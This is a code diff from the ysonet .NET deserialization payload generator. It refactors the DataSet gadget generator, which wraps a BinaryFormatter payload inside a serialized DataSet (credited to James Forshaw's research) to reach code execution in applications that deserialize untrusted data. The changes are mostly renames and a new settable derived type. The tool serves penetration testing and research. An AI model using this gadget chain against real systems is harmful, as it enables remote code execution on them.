@@ -7,13 +7,8 @@ using ysonet.Helpers;
 
 namespace ysonet.Generators
 {
-    public class DataSetGenerator:GenericGenerator
+    public class DataSetGenerator : GenericGenerator
     {
-        public override string Name()
-        {
-            return "DataSet";
-        }
-
         public override string Finders()
         {
             return "James Forshaw";
@@ -26,12 +21,12 @@ namespace ysonet.Generators
 
         public override List<string> Labels()
         {
-            return new List<string> { GadgetTypes.BridgeAndDerived };
+            return new List<string> { GadgetTags.Bridged };
         }
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "BinaryFormatter", "SoapFormatter", "LosFormatter"};
+            return new List<string> { "BinaryFormatter", "SoapFormatter", "LosFormatter" };
         }
 
         public override string SupportedBridgedFormatter()
@@ -50,13 +45,13 @@ namespace ysonet.Generators
             {
                 binaryFormatterPayload = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
             }
-            
-            DataSetMarshal payloadDataSetMarshal = new DataSetMarshal(binaryFormatterPayload);
+
+            DataSetBinaryMarshal payloadDataSetMarshal = new DataSetBinaryMarshal(binaryFormatterPayload);
 
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("soapformatter", StringComparison.OrdinalIgnoreCase))
-            { 
+            {
                 return Serialize(payloadDataSetMarshal, formatter, inputArgs);
             }
             else
@@ -68,13 +63,14 @@ namespace ysonet.Generators
 
     // https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf
     [Serializable]
-    public class DataSetMarshal : ISerializable
+    public class DataSetBinaryMarshal : ISerializable
     {
         byte[] _fakeTable;
+        Type _derivedType = typeof(System.Data.DataSet);
 
         public void GetObjectData(SerializationInfo info, StreamingContext context)
         {
-            info.SetType(typeof(System.Data.DataSet));
+            info.SetType(_derivedType);
             info.AddValue("DataSet.RemotingFormat", System.Data.SerializationFormat.Binary);
             info.AddValue("DataSet.DataSetName", "");
             info.AddValue("DataSet.Namespace", "");
@@ -92,17 +88,22 @@ namespace ysonet.Generators
             _fakeTable = bfPayload;
         }
 
-        public DataSetMarshal(byte[] bfPayload)
+        public void SetDerivedType(Type type)
+        {
+            _derivedType = type;
+        }
+
+        public DataSetBinaryMarshal(byte[] bfPayload)
         {
             SetFakeTable(bfPayload);
         }
 
-        public DataSetMarshal(object fakeTable):this(fakeTable, new InputArgs())
+        public DataSetBinaryMarshal(object fakeTable) : this(fakeTable, new InputArgs())
         {
             // This won't use anything we might have defined in ysonet.net BinaryFormatter process (such as minification)
         }
 
-        public DataSetMarshal(object fakeTable, InputArgs inputArgs)
+        public DataSetBinaryMarshal(object fakeTable, InputArgs inputArgs)
         {
             MemoryStream stm = new MemoryStream();
             if (inputArgs.Minify)
@@ -119,7 +120,7 @@ namespace ysonet.Generators
             SetFakeTable(stm.ToArray());
         }
 
-        public DataSetMarshal(MemoryStream ms)
+        public DataSetBinaryMarshal(MemoryStream ms)
         {
             SetFakeTable(ms.ToArray());
         }
